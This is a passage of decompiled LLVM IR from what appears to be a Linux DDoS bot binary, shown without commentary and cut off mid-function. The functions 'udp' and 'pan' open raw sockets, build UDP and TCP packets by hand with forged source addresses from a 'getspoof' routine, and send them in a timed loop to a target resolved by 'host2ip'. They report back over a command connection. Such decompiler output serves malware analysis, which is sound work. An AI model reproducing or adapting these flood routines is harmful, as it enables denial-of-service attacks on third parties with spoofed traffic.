  %v3_8049277 = call i32 @_strlen(i8* %v3_8049255)
  %v1_804927e = add i32 %v3_8049277, -1
  store i32 %v1_804927e, i32* %eax.global-to-local, align 4
  %v0_804927f = load i32, i32* @ebp, align 4
  %v2_804927f = add i32 %v3_8049277, -273
  %v3_804927f = add i32 %v2_804927f, %v0_804927f
  %v4_804927f = inttoptr i32 %v3_804927f to i8*
  %v5_804927f = load i8, i8* %v4_804927f, align 1
  %v6_804927f = zext i8 %v5_804927f to i32
  %v8_804927f = and i32 %v1_804927e, -256
  %v9_804927f = or i32 %v6_804927f, %v8_804927f
  store i32 %v9_804927f, i32* %eax.global-to-local, align 4
  %v10_8049286 = icmp eq i8 %v5_804927f, 46
  %v1_8049288 = icmp eq i1 %v10_8049286, false
  br i1 %v1_8049288, label %dec_label_pc_80492d8, label %dec_label_pc_804928a

dec_label_pc_804928a:                             ; preds = %dec_label_pc_8049242
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492a4 = call i32 @_strlen(i8* %v3_8049255)
  %v1_80492ab = add i32 %v3_80492a4, -1
  store i32 %v1_80492ab, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @ebp, align 4
  %v2_80492ac = add i32 %v3_80492a4, -273
  %v3_80492ac = add i32 %v2_80492ac, %v0_80492ac
  %v4_80492ac = inttoptr i32 %v3_80492ac to i8*
  store i8 0, i8* %v4_80492ac, align 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492c4:                             ; preds = %dec_label_pc_80492d8
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_80492c7 = load i32, i32* @ebp, align 4
  %v2_80492c7 = add i32 %stack_var_-20.0, -272
  %v3_80492c7 = add i32 %v2_80492c7, %v0_80492c7
  %v4_80492c7 = inttoptr i32 %v3_80492c7 to i8*
  %v5_80492c7 = load i8, i8* %v4_80492c7, align 1
  %v6_80492c7 = zext i8 %v5_80492c7 to i32
  %v8_80492c7 = and i32 %stack_var_-20.0, -256
  %v9_80492c7 = or i32 %v6_80492c7, %v8_80492c7
  store i32 %v9_80492c7, i32* %eax.global-to-local, align 4
  %v10_80492ce = icmp eq i8 %v5_80492c7, 46
  %v1_80492d0 = icmp eq i1 %v10_80492ce, false
  br i1 %v1_80492d0, label %dec_label_pc_80492d5, label %dec_label_pc_80492d2

dec_label_pc_80492d2:                             ; preds = %dec_label_pc_80492c4
  %v4_80492d2 = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_80492d5

dec_label_pc_80492d5:                             ; preds = %dec_label_pc_80492c4, %dec_label_pc_80492d2
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_80492c4 ], [ %v4_80492d2, %dec_label_pc_80492d2 ]
  %v4_80492d5 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492d8:                             ; preds = %dec_label_pc_804928a, %dec_label_pc_8049242, %dec_label_pc_80492d5
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_80492d5 ], [ 1, %dec_label_pc_8049242 ], [ 1, %dec_label_pc_804928a ]
  %stack_var_-20.0 = phi i32 [ %v4_80492d5, %dec_label_pc_80492d5 ], [ 0, %dec_label_pc_8049242 ], [ 0, %dec_label_pc_804928a ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492f5 = call i32 @_strlen(i8* %v3_8049255)
  store i32 %v3_80492f5, i32* %eax.global-to-local, align 4
  %v0_80492fc = load i32, i32* @edx, align 4
  %v7_80492fc = icmp ult i32 %v0_80492fc, %v3_80492f5
  br i1 %v7_80492fc, label %dec_label_pc_80492c4, label %dec_label_pc_8049300

dec_label_pc_8049300:                             ; preds = %dec_label_pc_80492d8
  %v5_8049305 = sub i32 4, %stack_var_-16.1
  %v15_8049305 = icmp eq i32 %v5_8049305, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804935029 = icmp sgt i32 %v5_8049305, 0
  br i1 %v5_804935029, label %dec_label_pc_8049314, label %dec_label_pc_8049352

dec_label_pc_8049314:                             ; preds = %dec_label_pc_8049300, %dec_label_pc_8049314
  %storemerge230 = phi i32 [ %v4_8049347, %dec_label_pc_8049314 ], [ 0, %dec_label_pc_8049300 ]
  store i32 %v2_804924e, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_8049334 = call i32 @_strlen(i8* %v3_8049255)
  %v0_804933b = load i32, i32* @edx, align 4
  %v0_804933b31 = add i32 %v0_804933b, %v3_8049334
  store i32 %v0_804933b31, i32* %eax.global-to-local, align 4
  %v1_804933e = inttoptr i32 %v0_804933b31 to i16*
  store i16 12334, i16* %v1_804933e, align 2
  %v0_8049343 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049343 = add i32 %v0_8049343, 2
  %v2_8049343 = inttoptr i32 %v1_8049343 to i8*
  store i8 0, i8* %v2_8049343, align 1
  %v4_8049347 = add nuw nsw i32 %storemerge230, 1
  store i32 %v4_8049347, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8049347, %v5_8049305
  br i1 %exitcond, label %dec_label_pc_8049352, label %dec_label_pc_8049314

dec_label_pc_8049352:                             ; preds = %dec_label_pc_8049314, %dec_label_pc_8049300
  store i32 %v2_804924e, i32* @eax, align 4
  %v2_804935c = call i32 @inet_network(i8* %v3_8049255)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_804936b = icmp eq i1 %v15_8049305, false
  br i1 %v1_804936b, label %dec_label_pc_8049379, label %dec_label_pc_804938e

dec_label_pc_8049379:                             ; preds = %dec_label_pc_8049352
  %v3_8049381 = call i32 @pow(i64 256, i32 %v5_8049305)
  store i32 %v3_8049381, i32* %eax.global-to-local, align 4
  %v1_8049389 = sext i32 %v3_8049381 to i64
  br label %dec_label_pc_804938e

dec_label_pc_804938e:                             ; preds = %dec_label_pc_8049352, %dec_label_pc_8049379
  %storemerge = phi i64 [ %v1_8049389, %dec_label_pc_8049379 ], [ 1, %dec_label_pc_8049352 ]
  store i64 %storemerge, i64* @global_var_8062a8c.33, align 8
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_8049391 = inttoptr i32 %v2_804935c to i8*
  store i8* %v1_8049391, i8** @global_var_8062a88.32, align 8
  br label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_8049227, %dec_label_pc_80491d0, %dec_label_pc_804938e
  %v0_804939a = phi i32 [ %v3_8049235, %dec_label_pc_8049227 ], [ %v3_80491de, %dec_label_pc_80491d0 ], [ %v2_804935c, %dec_label_pc_804938e ]
  ret i32 %v0_804939a

; uselistorder directives
  uselistorder i32 %v2_804935c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_8049347, { 1, 2, 0 }
  uselistorder i32 %v5_8049305, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-20.0, { 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_804926e, { 1, 2, 0, 3 }
  uselistorder i8* %v3_8049255, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_8049221, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 22, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i64, i32)* @pow, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049396, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804938e, { 1, 0 }
  uselistorder label %dec_label_pc_8049314, { 1, 0 }
  uselistorder label %dec_label_pc_80492d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80492d5, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80493a7 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_80493a7, i32* @global_var_8062ea0.68, align 32
  %v10_80493b9 = icmp eq i32 %v1_80493a7, -1
  %v1_80493bc = icmp eq i1 %v10_80493b9, false
  br i1 %v1_80493bc, label %dec_label_pc_804941b, label %dec_label_pc_80493be

dec_label_pc_80493be:                             ; preds = %entry
  %v1_80493c4 = call i32 @__GI_gethostbyname(i32 %arg2)
  %v4_80493cf = icmp eq i32 %v1_80493c4, 0
  %v1_80493d3 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d3, label %dec_label_pc_80493f8, label %dec_label_pc_80493d5

dec_label_pc_80493d5:                             ; preds = %dec_label_pc_80493be
  %v0_80493d5 = load i32, i32* @global_var_8067528.28, align 8
  %v2_80493e6 = call i32 @Send(i32 %v0_80493d5, i32 ptrtoint ([33 x i8]* @global_var_805a7cc.69 to i32))
  %v1_80493f3 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80493f8

dec_label_pc_80493f8:                             ; preds = %dec_label_pc_80493be, %dec_label_pc_80493d5
  %v1_80493fb = add i32 %v1_80493c4, 12
  %v2_80493fb = inttoptr i32 %v1_80493fb to i32*
  %v3_80493fb = load i32, i32* %v2_80493fb, align 4
  %v1_8049408 = add i32 %v1_80493c4, 16
  %v2_8049408 = inttoptr i32 %v1_8049408 to i32*
  %v3_8049408 = load i32, i32* %v2_8049408, align 4
  %v1_804940b = inttoptr i32 %v3_8049408 to i32*
  %v2_804940b = load i32, i32* %v1_804940b, align 4
  %v3_8049413 = call i32 @bcopy(i32 %v2_804940b, i32 ptrtoint (i32* @global_var_8062ea0.68 to i32), i32 %v3_80493fb)
  %v0_804941b.pre = load i32, i32* @global_var_8062ea0.68, align 32
  br label %dec_label_pc_804941b

dec_label_pc_804941b:                             ; preds = %entry, %dec_label_pc_80493f8
  %v0_804941b = phi i32 [ %v1_80493a7, %entry ], [ %v0_804941b.pre, %dec_label_pc_80493f8 ]
  ret i32 %v0_804941b

; uselistorder directives
  uselistorder i32 %v1_80493a7, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804941b, { 1, 0 }
  uselistorder label %dec_label_pc_80493f8, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %v2_8049437 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049437, i32* @eax, align 4
  %v1_8049448 = call i32 @mfork(i32 %arg2)
  %v1_8049450 = icmp eq i32 %v1_8049448, 0
  %v1_8049452 = icmp eq i1 %v1_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_80496ac, label %dec_label_pc_8049458

dec_label_pc_8049458:                             ; preds = %entry
  %v4_8049464 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804946f = icmp slt i32 %v4_8049464, 0
  %v1_8049473 = icmp eq i1 %v5_804946f, false
  br i1 %v1_8049473, label %dec_label_pc_804947f, label %dec_label_pc_8049475

dec_label_pc_8049475:                             ; preds = %dec_label_pc_8049458
  %v1_804947a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804947f

dec_label_pc_804947f:                             ; preds = %dec_label_pc_8049458, %dec_label_pc_8049475
  %v4_804947f = add i32 %arg3, -2
  %v9_804947f = sub i32 1, %arg3
  %v10_804947f = and i32 %v9_804947f, %arg3
  %v11_804947f = icmp slt i32 %v10_804947f, 0
  %v12_804947f = icmp eq i32 %v4_804947f, 0
  %v13_804947f = icmp slt i32 %v4_804947f, 0
  %v3_8049483 = icmp eq i1 %v13_804947f, %v11_804947f
  %v4_8049483 = icmp eq i1 %v12_804947f, false
  %v5_8049483 = and i1 %v4_8049483, %v3_8049483
  br i1 %v5_8049483, label %dec_label_pc_80494a5, label %dec_label_pc_8049485

dec_label_pc_8049485:                             ; preds = %dec_label_pc_804947f
  %v3_8049493 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a7f0.70 to i32))
  %v1_80494a0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_80494a5

dec_label_pc_80494a5:                             ; preds = %dec_label_pc_804947f, %dec_label_pc_8049485
  %v1_80494a8 = add i32 %arg4, 4
  %v1_80494ab = inttoptr i32 %v1_80494a8 to i32*
  %v2_80494ab = load i32, i32* %v1_80494ab, align 4
  %v3_80494b4 = call i32 @host2ip(i32 %arg2, i32 %v2_80494ab)
  %v1_80494c2 = add i32 %arg4, 8
  %v1_80494c5 = inttoptr i32 %v1_80494c2 to i32*
  %v2_80494c5 = load i32, i32* %v1_80494c5, align 4
  %v1_80494cb = call i32 @atol(i32 %v2_80494c5)
  %v1_80494d9 = add i32 %arg4, 12
  %v1_80494dc = inttoptr i32 %v1_80494d9 to i32*
  %v2_80494dc = load i32, i32* %v1_80494dc, align 4
  %v1_80494e2 = call i32 @atol(i32 %v2_80494dc)
  %v2_80494ed = ptrtoint i32* %stack_var_-1560 to i32
  %tmp41 = bitcast i32* %stack_var_-1540 to i16*
  %v4_804951b = bitcast i32* %stack_var_-1532 to i8*
  %v5_804951b = call i32 @__GI_memset(i8* %v4_804951b, i32 10, i32 1472)
  %v3_8049537 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805a817.71 to i32))
  %v3_804954a = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804954a, align 4
  %v1_804955c = or i32 %v2_80494ed, 1
  %v2_804955c = inttoptr i32 %v1_804955c to i8*
  store i8 0, i8* %v2_804955c, align 1
  %v1_8049563 = or i32 %v2_80494ed, 2
  %v2_8049563 = inttoptr i32 %v1_8049563 to i16*
  store i16 1500, i16* %v2_8049563, align 2
  %v1_804956c = add i32 %v2_80494ed, 6
  %v2_804956c = inttoptr i32 %v1_804956c to i16*
  store i16 0, i16* %v2_804956c, align 2
  %v1_8049575 = add i32 %v2_80494ed, 9
  %v2_8049575 = inttoptr i32 %v1_8049575 to i8*
  store i8 17, i8* %v2_8049575, align 1
  %v1_804957c = add i32 %v2_80494ed, 8
  %v2_804957c = inttoptr i32 %v1_804957c to i8*
  store i8 64, i8* %v2_804957c, align 4
  %v2_8049586 = add i32 %v2_80494ed, 16
  %v3_8049586 = inttoptr i32 %v2_8049586 to i32*
  store i32 %v3_80494b4, i32* %v3_8049586, align 4
  %v1_804958c = urem i32 %tmp12, 65536
  %v1_8049595 = call i32 @htons(i32 %v1_804958c)
  %v2_8049595 = trunc i32 %v1_8049595 to i16
  %v4_804959f = ptrtoint i32* %stack_var_-1540 to i32
  %v3_80495a2 = add i32 %v4_804959f, 4
  %v4_80495a2 = inttoptr i32 %v3_80495a2 to i16*
  store i16 %v2_8049595, i16* %v4_80495a2, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v4_80495bf = icmp eq i32 %v1_80494cb, 0
  %v3_80495ee = or i32 %v4_804959f, 2
  %v4_80495ee = inttoptr i32 %v3_80495ee to i16*
  %v2_80495fe = bitcast i32* %stack_var_-1560 to i16*
  %v3_804960b = add i32 %v4_804959f, 6
  %v4_804960b = inttoptr i32 %v3_804960b to i16*
  %v2_8049619 = add i32 %v2_80494ed, 12
  %v3_8049619 = inttoptr i32 %v2_8049619 to i32*
  %v3_8049626 = add i32 %v2_80494ed, 4
  %v4_8049626 = inttoptr i32 %v3_8049626 to i16*
  %v3_8049643 = add i32 %v2_80494ed, 10
  %v4_8049643 = inttoptr i32 %v3_8049643 to i16*
  %v2_8049652 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804968c = add i32 %v1_80494e2, %v2_8049437
  %v1_80495c8 = urem i32 %v1_80494cb, 65536
  br label %dec_label_pc_80495b2

dec_label_pc_80495b2:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80494a5
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80494a5 ], [ %v4_80496a4, %dec_label_pc_80496a4 ]
  %v0_80495b2 = call i32 @random()
  %sext = mul i32 %v0_80495b2, 65536
  %v1_80495b7 = sdiv i32 %sext, 65536
  %v1_80495bc = trunc i32 %v1_80495b7 to i16
  store i16 %v1_80495bc, i16* %tmp41, align 4
  br i1 %v4_80495bf, label %dec_label_pc_80495e4, label %dec_label_pc_80495c5

dec_label_pc_80495c5:                             ; preds = %dec_label_pc_80495b2
  %v1_80495d1 = call i32 @htons(i32 %v1_80495c8)
  br label %dec_label_pc_80495f2

dec_label_pc_80495e4:                             ; preds = %dec_label_pc_80495b2
  %v0_80495e4 = call i32 @random()
  %sext5 = mul i32 %v0_80495e4, 65536
  %v1_80495e9 = sdiv i32 %sext5, 65536
  br label %dec_label_pc_80495f2

dec_label_pc_80495f2:                             ; preds = %dec_label_pc_80495c5, %dec_label_pc_80495e4
  %storemerge.in = phi i32 [ %v1_80495e9, %dec_label_pc_80495e4 ], [ %v1_80495d1, %dec_label_pc_80495c5 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i16 %storemerge, i16* %v4_80495ee, align 2
  %v3_80495fe = call i32 @in_cksum(i16* %v2_80495fe, i32 1500)
  %v4_80495fe = trunc i32 %v3_80495fe to i16
  store i16 %v4_80495fe, i16* %v4_804960b, align 2
  %v0_804960f = call i32 @getspoof()
  store i32 %v0_804960f, i32* %v3_8049619, align 4
  %v0_804961c = call i32 @random()
  %sext4 = mul i32 %v0_804961c, 65536
  %v1_8049621 = sdiv i32 %sext4, 65536
  %v1_8049626 = trunc i32 %v1_8049621 to i16
  store i16 %v1_8049626, i16* %v4_8049626, align 4
  %v3_8049636 = call i32 @in_cksum(i16* %v2_80495fe, i32 1500)
  %v4_8049636 = trunc i32 %v3_8049636 to i16
  store i16 %v4_8049636, i16* %v4_8049643, align 2
  %v7_804966c = call i32 @sendto(i32 %v4_8049464, i32 %v2_80494ed, i32 1500, i32 0, i32 %v2_8049652, i32 16)
  %tmp42 = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp42, label %dec_label_pc_80496a4, label %dec_label_pc_804967a

dec_label_pc_804967a:                             ; preds = %dec_label_pc_80495f2
  %v2_804967f = call i32 @__GI_time(i32* null)
  %v7_804968f = icmp ult i32 %v2_804967f, %v5_804968c
  br i1 %v7_804968f, label %dec_label_pc_80496a4, label %dec_label_pc_8049693

dec_label_pc_8049693:                             ; preds = %dec_label_pc_804967a
  %v1_8049698 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_8049693, %dec_label_pc_804967a, %dec_label_pc_80495f2
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_80495f2 ], [ 0, %dec_label_pc_804967a ], [ 0, %dec_label_pc_8049693 ]
  %v4_80496a4 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_80495b2

dec_label_pc_80496ac:                             ; preds = %entry
  ret i32 %v1_8049448

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v2_80494ed, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v4_804947f, { 1, 0 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80495f2, { 1, 0 }
  uselistorder label %dec_label_pc_80494a5, { 1, 0 }
  uselistorder label %dec_label_pc_804947f, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i16, align 2
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_805a840.72 to i32), i32* %edx.global-to-local, align 4
  %v3_80496cd = bitcast i32* %stack_var_-252 to i16*
  %v4_80496cd = call i32 @memcpy(i16* %v3_80496cd, i32 ptrtoint (i32* @global_var_805a840.72 to i32), i32 80)
  %v2_80496e8 = call i32 @__GI_time(i32* null)
  store i32 %v2_80496e8, i32* @eax, align 4
  %v1_80496f9 = call i32 @mfork(i32 %arg2)
  %v1_8049701 = icmp eq i32 %v1_80496f9, 0
  %v1_8049703 = icmp eq i1 %v1_8049701, false
  br i1 %v1_8049703, label %dec_label_pc_8049a6c, label %dec_label_pc_8049709

dec_label_pc_8049709:                             ; preds = %entry
  %v4_8049709 = add i32 %arg3, -2
  %v9_8049709 = sub i32 1, %arg3
  %v10_8049709 = and i32 %v9_8049709, %arg3
  %v11_8049709 = icmp slt i32 %v10_8049709, 0
  %v12_8049709 = icmp eq i32 %v4_8049709, 0
  %v13_8049709 = icmp slt i32 %v4_8049709, 0
  %v3_804970d = icmp eq i1 %v13_8049709, %v11_8049709
  %v4_804970d = icmp eq i1 %v12_8049709, false
  %v5_804970d = and i1 %v4_804970d, %v3_804970d
  br i1 %v5_804970d, label %dec_label_pc_804972f, label %dec_label_pc_804970f

dec_label_pc_804970f:                             ; preds = %dec_label_pc_8049709
  %v2_804971d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a890.73 to i32))
  %v1_804972a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804972f

dec_label_pc_804972f:                             ; preds = %dec_label_pc_8049709, %dec_label_pc_804970f
  %v3_804973b = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049746 = icmp slt i32 %v3_804973b, 0
  %v1_804974a = icmp eq i1 %v5_8049746, false
  br i1 %v1_804974a, label %dec_label_pc_8049773.preheader, label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_804972f
  %v1_8049751 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8049773.preheader

dec_label_pc_8049773.preheader:                   ; preds = %dec_label_pc_804972f, %dec_label_pc_804974c
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_8049773.preheader, %dec_label_pc_804975f
  %storemerge84 = phi i32 [ 0, %dec_label_pc_8049773.preheader ], [ %v4_8049770, %dec_label_pc_804975f ]
  store i32 %storemerge84, i32* @edx, align 4
  %v0_8049765 = load i32, i32* @ebp, align 4
  %v2_8049765 = mul nuw nsw i32 %storemerge84, 4
  %v3_8049765 = add nuw nsw i32 %v2_8049765, -248
  %v4_8049765 = add i32 %v3_8049765, %v0_8049765
  %v5_8049765 = inttoptr i32 %v4_8049765 to i32*
  %v6_8049765 = load i32, i32* %v5_8049765, align 4
  %v1_804976c = trunc i32 %v6_8049765 to i8
  %v4_804976c = add nuw nsw i32 %storemerge84, -60
  %v5_804976c = add i32 %v4_804976c, %v0_8049765
  %v6_804976c = inttoptr i32 %v5_804976c to i8*
  store i8 %v1_804976c, i8* %v6_804976c, align 1
  %v4_8049770 = add nuw nsw i32 %storemerge84, 1
  %exitcond = icmp eq i32 %v4_8049770, 20
  br i1 %exitcond, label %dec_label_pc_8049779, label %dec_label_pc_804975f

dec_label_pc_8049779:                             ; preds = %dec_label_pc_804975f
  %v1_804977c = add i32 %arg4, 4
  %v1_804977f = inttoptr i32 %v1_804977c to i32*
  %v2_804977f = load i32, i32* %v1_804977f, align 4
  %v3_8049788 = call i32 @host2ip(i32 %arg2, i32 %v2_804977f)
  %v1_8049796 = add i32 %arg4, 12
  %v1_8049799 = inttoptr i32 %v1_8049796 to i32*
  %v2_8049799 = load i32, i32* %v1_8049799, align 4
  %v1_804979f = call i32 @atol(i32 %v2_8049799)
  %v3_80497be = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805a8b7.74 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049863 = add i32 %arg4, 8
  %v1_8049866 = inttoptr i32 %v1_8049863 to i32*
  %v2_8049866 = load i32, i32* %v1_8049866, align 4
  %v1_804986c = call i32 @atol(i32 %v2_8049866)
  %v1_8049874 = urem i32 %v1_804986c, 65536
  %v1_804987d = call i32 @htons(i32 %v1_8049874)
  %v5_804988a = trunc i32 %v1_804987d to i16
  %v2_804992b = ptrtoint i8* %stack_var_-104 to i32
  %v2_80499b9 = ptrtoint i32* %stack_var_-156 to i32
  %v2_80499bf = ptrtoint i32* %stack_var_-144 to i32
  %v15_80499c5 = ptrtoint i16* %stack_var_-84 to i32
  %v12_80499e3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_80499ea = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049a10 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049a4c = add i32 %v1_804979f, %v2_80496e8
  br label %dec_label_pc_804988d

dec_label_pc_804988d:                             ; preds = %dec_label_pc_8049a64, %dec_label_pc_8049779
  %stack_var_-32.0 = phi i16 [ %v5_804988a, %dec_label_pc_8049779 ], [ %stack_var_-32.1, %dec_label_pc_8049a64 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049779 ], [ %v4_8049a64, %dec_label_pc_8049a64 ]
  %v0_804988d = call i32 @random()
  %v1_804988d = trunc i32 %v0_804988d to i16
  %v2_804989b = load i32, i32* %v1_8049866, align 4
  %v0_804989d = load i32, i32* @esp, align 4
  %v2_80498a0 = add i32 %v0_804989d, -16
  %v3_80498a0 = inttoptr i32 %v2_80498a0 to i32*
  store i32 %v2_804989b, i32* %v3_80498a0, align 4
  %sext11 = mul i32 %v0_804988d, 65536
  %v1_80498a1 = sdiv i32 %sext11, 65536
  %v2_80498a1 = call i32 @atol(i32 %v1_80498a1)
  %v1_80498a9 = icmp eq i32 %v2_80498a1, 0
  %v1_80498ab = icmp eq i1 %v1_80498a9, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b5, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %dec_label_pc_804988d
  %v0_80498ad = call i32 @random()
  %v1_80498ad = trunc i32 %v0_80498ad to i16
  br label %dec_label_pc_80498b5

dec_label_pc_80498b5:                             ; preds = %dec_label_pc_804988d, %dec_label_pc_80498ad
  %stack_var_-32.1 = phi i16 [ %stack_var_-32.0, %dec_label_pc_804988d ], [ %v1_80498ad, %dec_label_pc_80498ad ]
  %v0_80498b5 = call i32 @getspoof()
  %v0_80498c8 = load i32, i32* @esp, align 4
  %v2_80498cb = add i32 %v0_80498c8, -16
  %v3_80498cb = inttoptr i32 %v2_80498cb to i32*
  store i32 60, i32* %v3_80498cb, align 4
  %v1_80498cc = call i32 @htons(i32 %v0_80498b5)
  %v1_80498d8 = call i32 @random()
  store i16 %v1_804988d, i16* %stack_var_-84, align 2
  %v4_80498fa = sext i16 %stack_var_-32.1 to i32
  %v1_8049901 = call i32 @random()
  store i32 2, i32* %stack_var_-172, align 4
  %v0_804992e = load i32, i32* @esp, align 4
  %v1_804992e = add i32 %v0_804992e, -4
  %v2_804992e = inttoptr i32 %v1_804992e to i32*
  store i32 20, i32* %v2_804992e, align 4
  %v2_8049930 = add i32 %v0_804992e, -8
  %v3_8049930 = inttoptr i32 %v2_8049930 to i32*
  store i32 %v2_804992b, i32* %v3_8049930, align 4
  %v0_8049931 = load i32, i32* %stack_var_-172, align 4
  %v3_8049931 = inttoptr i32 %v0_8049931 to i16*
  %v4_8049931 = call i32 @in_cksum(i16* %v3_8049931, i32 %v4_80498fa)
  %v1_804993d = call i32 @random()
  store i32 %v0_80498b5, i32* %stack_var_-156, align 4
  %v0_80499a6 = load i32, i32* @esp, align 4
  %v2_80499a9 = add i32 %v0_80499a6, -16
  %v3_80499a9 = inttoptr i32 %v2_80499a9 to i32*
  store i32 40, i32* %v3_80499a9, align 4
  %sext20 = mul i32 %v1_804993d, 16777216
  %v1_80499aa = sdiv i32 %sext20, 16777216
  %v2_80499aa = call i32 @htons(i32 %v1_80499aa)
  %v0_80499af = load i32, i32* @esp, align 4
  store i32 %v2_80499bf, i32* %edx.global-to-local, align 4
  %v1_80499cb = add i32 %v0_80499af, 8
  %v2_80499cb = inttoptr i32 %v1_80499cb to i32*
  store i32 20, i32* %v2_80499cb, align 4
  %v2_80499cd = add i32 %v0_80499af, 4
  %v3_80499cd = inttoptr i32 %v2_80499cd to i32*
  store i32 %v2_80499bf, i32* %v3_80499cd, align 4
  %v3_80499ce = inttoptr i32 %v0_80499af to i32*
  store i32 %v15_80499c5, i32* %v3_80499ce, align 4
  %sext13 = mul i32 %v2_80499aa, 65536
  %v1_80499cf = sdiv i32 %sext13, 65536
  %v4_80499cf = call i32 @bcopy(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499d4 = load i32, i32* @esp, align 4
  %v5_80499da = add i32 %v0_80499d4, 8
  %v6_80499da = inttoptr i32 %v5_80499da to i32*
  store i32 20, i32* %v6_80499da, align 4
  %v2_80499e6 = add i32 %v0_80499d4, 4
  %v3_80499e6 = inttoptr i32 %v2_80499e6 to i32*
  store i32 %v12_80499e3, i32* %v3_80499e6, align 4
  %v3_80499ed = inttoptr i32 %v0_80499d4 to i32*
  store i32 %v15_80499ea, i32* %v3_80499ed, align 4
  %v4_80499ee = call i32 @bcopy(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499f3 = load i32, i32* @esp, align 4
  store i32 %v2_80499b9, i32* %edx.global-to-local, align 4
  %v2_8049a02 = add i32 %v0_80499f3, 12
